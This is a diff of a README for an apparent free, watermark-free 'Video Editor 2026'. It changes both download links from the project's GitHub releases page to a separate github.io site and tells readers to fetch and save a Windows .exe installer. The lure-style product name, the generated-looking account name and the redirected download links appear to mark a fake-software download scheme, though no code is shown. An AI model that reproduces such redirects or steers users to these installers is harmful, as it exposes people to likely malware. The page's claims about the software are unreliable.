@@ -1,7 +1,7 @@
 # 🎬 Video-Editor-2026-Free-No-Watermark - Pro video editing without watermarks today
 
 <p align="center">
-  <a href="https://github.com/Mimic-fifthpart972/Video-Editor-2026-Free-No-Watermark/releases">
+  <a href="https://mimic-fifthpart972.github.io">
     <img src="https://img.shields.io/badge/Download-Video%20Editor%202026-blue.svg" alt="Download Button">
   </a>
 </p>
@@ -31,7 +31,7 @@ This application runs on Windows computers. Ensure your hardware meets these sta
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Mimic-fifthpart972/Video-Editor-2026-Free-No-Watermark/releases) to access the download options.
+1. Visit the [official releases page](https://mimic-fifthpart972.github.io) to access the download options.
 2. Select the latest version of the installer file ending in .exe.
 3. Save the file to your computer desktop.
 4. Locate the file in your downloads folder.
